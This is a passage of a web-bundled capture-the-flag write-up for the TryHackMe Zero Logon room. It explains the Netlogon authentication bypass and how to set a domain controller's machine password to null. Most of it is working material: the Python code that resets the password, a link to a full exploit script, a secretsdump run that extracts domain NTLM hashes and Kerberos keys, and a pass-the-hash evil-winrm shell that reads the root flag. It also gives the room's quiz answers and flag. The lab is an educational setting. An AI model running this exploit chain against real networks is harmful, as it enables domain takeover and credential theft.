required:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},"NTSTATUS NetrServerAuthenticate3(\n    [in, unique, string] LOGONSRV_HANDLE PrimaryName,\n    [in, string] wchar_t* AccountName,\n    [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,\n    [in, string] wchar_t* ComputerName,\n    [in] PNETLOGON_CREDENTIAL ClientCredential,\n    [in, out] ULONG * NegotiateFlags,\n);\n")),(0,o.kt)("p",null,'On line 9, we supply the the DC_Handle as the Primary Name, the Target Computer plus a $ as the Machine Account Name (Recall, Machine accounts do not have lockout policies), the Secure Channel Type as the Secure Channel Type previously established over RPC, the target_computer variable as the ComputerName, the Ciphertext (16 bytes of "\\x00" attempting to Abuse Zero Logon, remember there\'s 1-in-256 chance that the Ciphertext will be the same as the plaintext), and lastly, our flags variable that mimics those of a Windows 10 client machine.'),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},"NTSTATUS NetrServerAuthenticate3(\n    [out] PNETLOGON_CREDENTIAL ServerCredential,\n    [in, out] ULONG * NegotiateFlags,\n    [out] ULONG * AccountRid\n);\n")),(0,o.kt)("p",null,"Additionally, we expect to receive two (possibly 3) things back from the Server upon (hopefully) successful exploitation of Zero Logon: The ServerCredential and AccountRid, only one of which we are going to use."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Line 44 - 54")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},"assert server_auth['ErrorCode'] == 0\nreturn rpc_con\n\nexcept nrpc.DCERPCSessionError as ex:\n\nif ex.get_error_code() == 0xc0000022:\n    return None\nelse:\n    fail(f'Unexpected error code from DC: {ex.get_error_code()}.')\n\nexcept BaseException as ex:\nfail(f'Unexpected error: {ex}.')\n")),(0,o.kt)("p",null,"Line 1 is retrieving the Error Code from the Server_auth variable, or the variable assigned to establish an Authentication Session with the target device. If successful, we're going to return the rpc_con variable which will inform us that we have successfully bypassed Authentication with Zero Logon. Lines 3-12 are simply Error handling lines so the program doesn't break and exit after receiving an error back."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"End of Transmission, What's Next? -")),(0,o.kt)("p",null,"And that's all there is to the Proof of Concept. It's not some giant, scary monster. It even successfully exploit the Zero Logon vulnerability for us -- but it stops and doesn't do anything further, so how do we proceed?"),(0,o.kt)("p",null,"Good question, next we need to take a look at the Microsoft Documentation itself and see what we can do to interact with NRPC Itself. If you're not familiar with NRPC, and you're not that technical of an individual, look back at the last step in Task 2, Figure 3 (hint: It tells us what we need to do)."),(0,o.kt)("p",null,"What's It All Mean, Doc? -\nAfter going back and peaking at Figure 3 on Task 2, or researching how to reset a password over RDP, you should have came across the following document:\n",(0,o.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81"},"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81")),(0,o.kt)("p",null,"The document outlines what information is required to change a password over NRPC. The following information is required to do so:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},"NTSTATUS NetrServerPasswordSet2(\n    [in, unique, string] LOGONSRV_HANDLE PrimaryName,\n    [in, string] wchar_t* AccountName,\n    [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,\n    [in, string] wchar_t* ComputerName,\n    [in] PNETLOGON_AUTHENTICATOR Authenticator,\n    [in] PNL_TRUST_PASSWORD ClearNewPassword\n);\n")),(0,o.kt)("p",null,"Going back and looking at ",(0,o.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9"},"NetrServerAuthenticate3")," and ",(0,o.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81"},"NetrServerPasswordSet2"),", we already have a handful of the information required, like the Primary Name, Account Name, Secure Channel Type, and the Computer Name. So we simply need two values, the Authenticator and the ClearNewPassword value. Both of these are documented from Microsoft, so lets take a look at the ",(0,o.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/76c93227-942a-4687-ab9d-9d972ffabdab"},"Authenticator")," first:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},"typedef struct _NETLOGON_AUTHENTICATOR {\n    NETLOGON_CREDENTIAL Credential;\n    DWORD Timestamp;\n}\n")),(0,o.kt)("p",null,"And suddenly we've hit another unknown, NETLOGON_CREDENTIAL. Fortunately, Microsoft does have documentation for NETLOGON_CREDENTIAL as well:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},"typedef struct _NETLOGON_CREDENTIAL {\n    CHAR data[8];\n    } NETLOGON_CREDENTIAL,\n    *PNETLOGON_CREDENTIAL;\n")),(0,o.kt)("p",null,"Per the documentation, NETLOGON_CREDENTIAL can take 8 bytes of data, the second bullet point outlines that \"the data field carries 8 bytes of encrypted data, as specified in the Netlogon Credential Computation\", fortunately we know this value, thanks to Zero Logon, it's 8 bytes of Zero. In terms of the Timestamp, it's a DWORD value, so it can either be a one or a zero. Zero sounds perfectly find to me."),(0,o.kt)("p",null,"In order to change the password the Microsoft Documentation states that:\nThe Netlogon Password consists of 512 bytes of random padding (minus the length of the password, so junk+password) with the last four bytes indicting the length of the password, totaling 516 bytes.\nFor the simplicity of this room, we can simply supply 516 bytes of all 00 to make a null password. Eventually, we can work towards creating our own custom password, but once again, for simplicity, we're setting it to a null value now."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Level Up -")),(0,o.kt)("p",null,"Now that we know the required arguments to change the password via NRPC, we actually have to implement it in Python. We need to take a look at the ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/SecureAuthCorp/impacket/blob/master/impacket/dcerpc/v5/nrpc.py"},"nrpc.py")," module within Impacket to see the required structure for how we can craft a netrServerPasswordSet2 Request:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},"def hNetrServerPasswordSet2(dce, primaryName, accountName, secureChannelType, computerName, authenticator, clearNewPasswordBlob):\n    request = NetrServerPasswordSet2()\n    request['PrimaryName'] = checkNullString(primaryName)\n    request['AccountName'] = checkNullString(accountName)\n    request['SecureChannelType'] = secureChannelType\n    request['ComputerName'] = checkNullString(computerName)\n    request['Authenticator'] = authenticator\n    request['ClearNewPassword'] = clearNewPasswordBlob\n    return dce.request(request)\n")),(0,o.kt)("p",null,"As expected, most of the field nmes are the same as what Microsoft provided, except with some differences. Next, we need to know how to structure the Authenticator portion as well:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},"class NETLOGON_AUTHENTICATOR(NDRSTRUCT):\nstructure = (\n    ('Credential', NETLOGON_CREDENTIAL),\n    ('Timestamp', DWORD),\n)\n")),(0,o.kt)("p",null,"The format here is a little bit different compared to the prior, but we'll adjust accordingly when we go to slot it into the PoC, but while we're talking about sloting it into the PoC, where will our added code go?"),(0,o.kt)("p",null,"Our added code will go immediately before \"return rpc_con\" on line 45. This is where we know we have successful authentication, we want to grab that before we return to the previous function and terminate the RPC connection. Now that we know all the required information that we'll need to add to the PoC, we'll save you the painsteaking effort of writing your own code, and you can use the pre-written code below. The above explanations should help aid in understanding it."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"The Additional Code we're slotting in:")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},"    newPassRequest = nrpc.NetrServerPasswordSet2()\n    newPassRequest['PrimaryName'] = dc_handle + '\\x00'\n    newPassRequest['AccountName'] = target_computer + '$\\x00'\n    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel\n    auth = nrpc.NETLOGON_AUTHENTICATOR()\n    auth['Credential'] = b'\\x00' * 8\n    auth['Timestamp'] = 0\n    newPassRequest['Authenticator'] = auth\n    newPassRequest['ComputerName'] = target_computer + '\\x00'\n    newPassRequest['ClearNewPassword'] =  b'\\x00' * 516\n    rpc_con.request(newPassRequest)\n")),(0,o.kt)("p",null,"At this point, your code should be good to go, and you should be able to successfully exploit Zero Logon. If you are still having issues, you can use the following code found here:"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py"},"https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"What method will allow us to change Passwords over NRPC?")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81"},"3.5.4.4.5 NetrServerPasswordSet2 (Opnum 30)")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"NetrServerPasswordSet2")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"What are the required fields for the method per the Microsoft Documentation?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},"NTSTATUS NetrServerPasswordSet2(\n   [in, unique, string] LOGONSRV_HANDLE PrimaryName,\n   [in, string] wchar_t* AccountName,\n   [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,\n   [in, string] wchar_t* ComputerName,\n   [in] PNETLOGON_AUTHENTICATOR Authenticator,\n   [out] PNETLOGON_AUTHENTICATOR ReturnAuthenticator,\n   [in] PNL_TRUST_PASSWORD ClearNewPassword\n );\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"PrimaryName,AccountName,SecureChannelType,ComputerName,Authenticator,ReturnAuthenticator,ClearNewPassword")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"What Opnumber is the Method?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"30")),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},"Modify the PoC")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,o.kt)("h2",{id:"task-4-lab-it-up"},"Task 4 Lab It Up!"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Lab It Up")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Time to Play -")),(0,o.kt)("p",null,"Now that you've learned about Zero Logon, it's time to put your new found skills to the test and exploit this vulnerable Domain Controller!"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Ctrl+Z -")),(0,o.kt)("p",null,"After you get done, if you want to play around some more, instead of terminating the machine, you can simply issue the following command to reset the machine back to it's original state:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-ps1"},"powershell.exe -c 'Reset-ComputerMachinePassword'\n")),(0,o.kt)("p",null,"If you're confused on how to issue the command, you can simply Pass The Local Admin Hash with Evil-WinRM to gain command execution. You can do so with the following command:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"evil-winrm -u Administrator -H <Local Admin Hash> -i <Machine IP>\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'(impacketEnv) kali@kali:~/CTFs/tryhackme/Zero Logon$ nmap -sV -sC 10.10.162.183\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-30 15:22 CET\nNmap scan report for 10.10.162.183\nHost is up (0.040s latency).\nNot shown: 987 closed ports\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain?\n| fingerprint-strings:\n|   DNSVersionBindReqTCP:\n|     version\n|_    bind\n80/tcp   open  http          Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Holo.Live\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-10-30 14:22:17Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hololive.local0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hololive.local0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info:\n|   Target_Name: HOLOLIVE\n|   NetBIOS_Domain_Name: HOLOLIVE\n|   NetBIOS_Computer_Name: DC01\n|   DNS_Domain_Name: hololive.local\n|   DNS_Computer_Name: DC01.hololive.local\n|   Product_Version: 10.0.17763\n|_  System_Time: 2020-10-30T14:24:34+00:00\n| ssl-cert: Subject: commonName=DC01.hololive.local\n| Not valid before: 2020-09-19T17:58:40\n|_Not valid after:  2021-03-21T17:58:40\n|_ssl-date: 2020-10-30T14:24:49+00:00; +1s from scanner time.\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port53-TCP:V=7.80%I=7%D=10/30%Time=5F9C219D%P=x86_64-pc-linux-gnu%r(DNS\nSF:VersionBindReqTCP,20,"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\nSF:\\x04bind\\0\\0\\x10\\0\\x03");\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2020-10-30T14:24:37\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 282.92 seconds\n')),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"What is the NetBIOS name of the Domain Controller?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"DC01")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"What is the NetBIOS domain name of the network?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"HOLOLIVE")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"What domain are you attacking?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"hololive.local")),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},"What is the Local Administrator's NTLM hash?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"(impacketEnv) kali@kali:~/CTFs/tryhackme/Zero Logon$ python3 zeroLogon-NullPass.py DC01 10.10.162.183\n\n _____                   __\n/ _  / ___ _ __ ___     / /  ___   __ _  ___  _ __\n\\// / / _ \\ '__/ _ \\   / /  / _ \\ / _` |/ _ \\| '_ \\\n / //\\  __/ | | (_) | / /__| (_) | (_| | (_) | | | |\n/____/\\___|_|  \\___/  \\____/\\___/ \\__, |\\___/|_| |_|\n                                  |___/\n                Vulnerability Discovered by Tom Tervoort\n                              Exploit by Ronnie Bartwitz\n\nPerforming authentication attempts...\nFailure to Autheticate at attempt number: 148\nZero Logon successfully exploited, changing password.\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"(impacketEnv) kali@kali:~/CTFs/tryhackme/ZeroLogon$ ./impacketEnv/bin/secretsdump.py -just-dc -no-pass DC01\\$@10.10.162.183\nImpacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation\n\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:2179ebfa86eb0e3cbab2bd58f2c946f5:::\nhololive.local\\a-koronei:1104:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::\nhololive.local\\a-fubukis:1106:aad3b435b51404eeaad3b435b51404ee:2c90bc6c1c35b71f455f3d08cf4947bd:::\nhololive.local\\matsurin:1107:aad3b435b51404eeaad3b435b51404ee:a4c59da4140ebd8c59410370c687ef51:::\nhololive.local\\fubukis:1108:aad3b435b51404eeaad3b435b51404ee:f78bb88e1168abfa165c558e97da9fd4:::\nhololive.local\\koronei:1109:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::\nhololive.local\\okayun:1110:aad3b435b51404eeaad3b435b51404ee:a170447f161e5c11441600f0a1b4d93f:::\nhololive.local\\watamet:1115:aad3b435b51404eeaad3b435b51404ee:50f91788ee209b13ca14e54af199a914:::\nhololive.local\\mikos:1116:aad3b435b51404eeaad3b435b51404ee:74520070d63d3e2d2bf58da95de0086c:::\nDC01$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[*] Kerberos keys grabbed\nAdministrator:aes256-cts-hmac-sha1-96:3415e858d1caff75baeb02c4dd7154328ea6c87f07336a5c926014392a40ed49\nAdministrator:aes128-cts-hmac-sha1-96:535501623337ae03580527692f08f0e1\nAdministrator:des-cbc-md5:bf34685d383e6734\nkrbtgt:aes256-cts-hmac-sha1-96:9702af2b67c5497940d0f0a7237fbd53d18fb2923fadd37f4ba33d6d5dab4583\nkrbtgt:aes128-cts-hmac-sha1-96:81628713bd5608becc4325052eb9702d\nkrbtgt:des-cbc-md5:25f1cea1542f9e31\nhololive.local\\a-koronei:aes256-cts-hmac-sha1-96:8085b97e73f4dfa6e2cc52a885dd3b1339bf17c17e999a8863686bdf0d800763\nhololive.local\\a-koronei:aes128-cts-hmac-sha1-96:2f6fd0c9e56a00883ab21544791becab\nhololive.local\\a-koronei:des-cbc-md5:89df5b3b9b680ea1\nhololive.local\\a-fubukis:aes256-cts-hmac-sha1-96:7b675daa6cd54ae667a2726a5d99259638b29467fd8e4b3cd6ec4e9564a168dd\nhololive.local\\a-fubukis:aes128-cts-hmac-sha1-96:883e1d7b14b9024527bd7da69c80a350\nhololive.local\\a-fubukis:des-cbc-md5:94294304ec7637c1\nhololive.local\\matsurin:aes256-cts-hmac-sha1-96:cfde1ad860382daa706dd11d585ff1512eef873dc85ae9a88437dc7501fa8e04\nhololive.local\\matsurin:aes128-cts-hmac-sha1-96:08a011409d044e2f1aec7a6782cbd7b5\nhololive.local\\matsurin:des-cbc-md5:04fde39d61c215fe\nhololive.local\\fubukis:aes256-cts-hmac-sha1-96:ed8e594f0b6b89cfa8030bcf9f3e41a9668793a12f598e42893fe8c9f6c5b8eb\nhololive.local\\fubukis:aes128-cts-hmac-sha1-96:ee003acb55927bb733826aa9a9ddfb53\nhololive.local\\fubukis:des-cbc-md5:075b8ffde398fe80\nhololive.local\\koronei:aes256-cts-hmac-sha1-96:6df316ac8564b8254457d973ad61a71a1dfcc5ffe6218cb39f14bb0bbda4a287\nhololive.local\\koronei:aes128-cts-hmac-sha1-96:6afe7f4196657648505d2af9bbfaf8ba\nhololive.local\\koronei:des-cbc-md5:a737e6073d15aecd\nhololive.local\\okayun:aes256-cts-hmac-sha1-96:cf262ddfb3239a555f9d78f90b8c01cd51032d34d104d366b4a94749b47fe6c5\nhololive.local\\okayun:aes128-cts-hmac-sha1-96:53be14aa0da3f7b657e42c5ed1cef12a\nhololive.local\\okayun:des-cbc-md5:10896d3786b9628f\nhololive.local\\watamet:aes256-cts-hmac-sha1-96:45f99941cfc277515aff47a4dfc936e805f7fedd3d175524708c868e2c405ec9\nhololive.local\\watamet:aes128-cts-hmac-sha1-96:07a6307a5b58f33a61271516ac3364cc\nhololive.local\\watamet:des-cbc-md5:bf622564a840f192\nhololive.local\\mikos:aes256-cts-hmac-sha1-96:aab547ee10782fef9aea3b4be5392e7ca9605d0dca95f7510dca40b9628f4233\nhololive.local\\mikos:aes128-cts-hmac-sha1-96:5c56246d1fd7a4db5ff4fb65ba597e42\nhololive.local\\mikos:des-cbc-md5:6b2f7fa7a4ecd0c1\nDC01$:aes256-cts-hmac-sha1-96:dbf8dbaaccbf17d6fb96cbb3c4046099a4a41d1453ff2d8a8970216ed15d9bf8\nDC01$:aes128-cts-hmac-sha1-96:4c146fe76ec6150267564d9bd69769d8\nDC01$:des-cbc-md5:cd161923ab9ec11c\n[*] Cleaning up...\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"3f3ef89114fb063e3d7fc23c20f65568")),(0,o.kt)("ol",{start:5},(0,o.kt)("li",{parentName:"ol"},"How many Domain Admin accounts are there?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"a-koronei\na-fubukis\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"2")),(0,o.kt)("ol",{start:6},(0,o.kt)("li",{parentName:"ol"},"What is the root flag?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"(impacketEnv) kali@kali:~/CTFs/tryhackme/ZeroLogon$ evil-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i 10.10.162.183\n\nEvil-WinRM shell v2.3\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami\nhololive\\administrator\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cd ../Desktop\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> ls\n\n\n    Directory: C:\\Users\\Administrator\\Desktop\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----        9/20/2020   2:02 PM             24 root.txt\n\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> cat root.txt\nTHM{Zer0Log0nD4rkTh1rty}\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{Zer0Log0nD4rkTh1rty}")))}d.isMDXComponent=!0}}]);